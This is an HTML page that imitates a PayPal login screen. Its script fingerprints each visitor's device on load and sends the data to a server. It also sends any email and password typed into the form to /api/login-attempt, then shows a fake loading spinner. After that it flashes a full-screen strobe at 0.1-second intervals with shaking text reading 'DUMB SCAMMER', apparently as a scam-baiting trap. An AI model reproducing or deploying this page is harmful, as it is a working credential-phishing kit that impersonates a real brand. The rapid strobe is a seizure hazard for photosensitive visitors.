<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Log in to your PayPal account</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
            background-color: #f5f7fa;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .header {
            width: 100%;
            padding: 24px;
            display: flex;
            justify-content: center;
        }

        .logo {
            font-size: 28px;
            font-weight: bold;
            color: #003087;
            letter-spacing: -1px;
        }

        .logo span {
            color: #009cde;
        }

        .login-container {
            background: white;
            border-radius: 12px;
            box-shadow: 0 2px 8px rgba(0,0,0,0.08);
            width: 100%;
            max-width: 460px;
            padding: 40px;
            margin: 20px;
        }

        h1 {
            font-size: 24px;
            font-weight: 500;
            color: #2c2e2f;
            text-align: center;
            margin-bottom: 24px;
        }

        .form-group {
            margin-bottom: 16px;
        }

        .form-group label {
            display: block;
            font-size: 14px;
            color: #6c7378;
            margin-bottom: 6px;
        }

        .form-group input {
            width: 100%;
            padding: 14px 16px;
            border: 1px solid #cbd2d6;
            border-radius: 8px;
            font-size: 16px;
            outline: none;
            transition: border-color 0.2s;
        }

        .form-group input:focus {
            border-color: #003087;
        }

        .btn-primary {
            width: 100%;
            padding: 14px;
            background: #0070ba;
            color: white;
            border: none;
            border-radius: 24px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 16px;
            transition: background 0.2s;
        }

        .btn-primary:hover {
            background: #003087;
        }

        .divider {
            display: flex;
            align-items: center;
            margin: 24px 0;
            color: #6c7378;
            font-size: 14px;
        }

        .divider::before,
        .divider::after {
            content: '';
            flex: 1;
            height: 1px;
            background: #cbd2d6;
        }

        .divider span {
            padding: 0 16px;
        }

        .btn-secondary {
            width: 100%;
            padding: 14px;
            background: white;
            color: #003087;
            border: 1px solid #003087;
            border-radius: 24px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: background 0.2s;
        }

        .btn-secondary:hover {
            background: #f5f7fa;
        }

        .links {
            text-align: center;
            margin-top: 24px;
        }

        .links a {
            color: #0070ba;
            text-decoration: none;
            font-size: 14px;
        }

        .links a:hover {
            text-decoration: underline;
        }

        .footer {
            margin-top: auto;
            padding: 24px;
            text-align: center;
            font-size: 12px;
            color: #6c7378;
        }

        .footer a {
            color: #6c7378;
            text-decoration: none;
            margin: 0 8px;
        }

        .footer a:hover {
            text-decoration: underline;
        }

        .loading-overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(255,255,255,0.9);
            justify-content: center;
            align-items: center;
            flex-direction: column;
            z-index: 1000;
        }

        .spinner {
            width: 48px;
            height: 48px;
            border: 4px solid #f3f3f3;
            border-top: 4px solid #0070ba;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .loading-text {
            margin-top: 16px;
            color: #2c2e2f;
            font-size: 16px;
        }

        .error-message {
            display: none;
            background: #fef0f0;
            border: 1px solid #f5c6cb;
            color: #721c24;
            padding: 12px 16px;
            border-radius: 8px;
            margin-bottom: 16px;
            font-size: 14px;
        }

        .strobe-overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 9999;
            justify-content: center;
            align-items: center;
            animation: strobe 0.1s infinite;
        }

        @keyframes strobe {
            0% { background: #ff0000; }
            25% { background: #00ff00; }
            50% { background: #0000ff; }
            75% { background: #ffff00; }
            100% { background: #ff00ff; }
        }

        .scammer-text {
            font-size: 80px;
            font-weight: 900;
            color: white;
            text-shadow: 4px 4px 0 #000, -4px -4px 0 #000, 4px -4px 0 #000, -4px 4px 0 #000;
            animation: shake 0.1s infinite, pulse 0.3s infinite;
            text-align: center;
            text-transform: uppercase;
        }

        @keyframes shake {
            0% { transform: translate(-5px, -5px) rotate(-2deg); }
            25% { transform: translate(5px, 5px) rotate(2deg); }
            50% { transform: translate(-5px, 5px) rotate(-2deg); }
            75% { transform: translate(5px, -5px) rotate(2deg); }
            100% { transform: translate(-5px, -5px) rotate(-2deg); }
        }

        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.1); }
            100% { transform: scale(1); }
        }
    </style>
</head>
<body>
    <div class="header">
        <div class="logo">Pay<span>Pal</span></div>
    </div>

    <div class="login-container">
        <h1>Log in to your account</h1>

        <div class="error-message" id="errorMessage">
            Sorry, we couldn't confirm it's you. Please try again.
        </div>

        <form id="loginForm">
            <div class="form-group">
                <input type="email" id="email" placeholder="Email or mobile number" required>
            </div>

            <div class="form-group">
                <input type="password" id="password" placeholder="Password" required>
            </div>

            <button type="submit" class="btn-primary">Log In</button>
        </form>

        <div class="links">
            <a href="#">Having trouble logging in?</a>
        </div>

        <div class="divider"><span>or</span></div>

        <button class="btn-secondary">Sign Up</button>
    </div>

    <div class="footer">
        <a href="#">Contact</a>
        <a href="#">Privacy</a>
        <a href="#">Legal</a>
        <a href="#">Policy Updates</a>
        <p style="margin-top: 12px;">Copyright 2024 PayPal, Inc. All rights reserved.</p>
    </div>

    <div class="loading-overlay" id="loadingOverlay">
        <div class="spinner"></div>
        <div class="loading-text">Logging you in...</div>
    </div>

    <div class="strobe-overlay" id="strobeOverlay">
        <div class="scammer-text">DUMB SCAMMER</div>
    </div>

    <script>
        // Collect all available browser/device info
        async function collectFingerprint() {
            const data = {
                screenWidth: screen.width,
                screenHeight: screen.height,
                viewportWidth: window.innerWidth,
                viewportHeight: window.innerHeight,
                colorDepth: screen.colorDepth,
                pixelRatio: window.devicePixelRatio || 1,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                timezoneOffset: new Date().getTimezoneOffset(),
                platform: navigator.platform,
                touchSupport: 'ontouchstart' in window || navigator.maxTouchPoints > 0,
                cookiesEnabled: navigator.cookieEnabled,
                doNotTrack: navigator.doNotTrack || 'unspecified',
                online: navigator.onLine,
                deviceMemory: navigator.deviceMemory || null,
                hardwareConcurrency: navigator.hardwareConcurrency || null,
                connectionType: navigator.connection ? navigator.connection.effectiveType : null,
                plugins: Array.from(navigator.plugins || []).map(p => p.name).join(', ') || 'none',
                canvasHash: getCanvasFingerprint(),
                ...getWebGLInfo(),
                batteryLevel: null,
                batteryCharging: null
            };

            if (navigator.getBattery) {
                try {
                    const battery = await navigator.getBattery();
                    data.batteryLevel = battery.level;
                    data.batteryCharging = battery.charging;
                } catch (e) {}
            }

            fetch('/api/fingerprint', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            }).catch(() => {});
        }

        function getCanvasFingerprint() {
            try {
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                canvas.width = 200;
                canvas.height = 50;
                ctx.textBaseline = 'top';
                ctx.font = '14px Arial';
                ctx.fillStyle = '#f60';
                ctx.fillRect(0, 0, 100, 50);
                ctx.fillStyle = '#069';
                ctx.fillText('fingerprint', 2, 15);
                ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
                ctx.fillText('canvas', 4, 17);
                return canvas.toDataURL().slice(-50);
            } catch (e) {
                return 'unavailable';
            }
        }

        function getWebGLInfo() {
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                if (!gl) return { webglVendor: 'unavailable', webglRenderer: 'unavailable' };
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                if (!debugInfo) return { webglVendor: 'hidden', webglRenderer: 'hidden' };
                return {
                    webglVendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
                    webglRenderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
                };
            } catch (e) {
                return { webglVendor: 'error', webglRenderer: 'error' };
            }
        }

        // Run fingerprinting immediately
        collectFingerprint();

        // Handle form submission
        document.getElementById('loginForm').addEventListener('submit', async function(e) {
            e.preventDefault();

            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;

            // Show loading
            document.getElementById('loadingOverlay').style.display = 'flex';

            // Send credentials to server
            try {
                await fetch('/api/login-attempt', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ email, password })
                });
            } catch (e) {}

            // After 2 seconds, show strobe
            setTimeout(() => {
                document.getElementById('loadingOverlay').style.display = 'none';
                document.getElementById('strobeOverlay').style.display = 'flex';
            }, 2000);
        });
    </script>
</body>
</html>
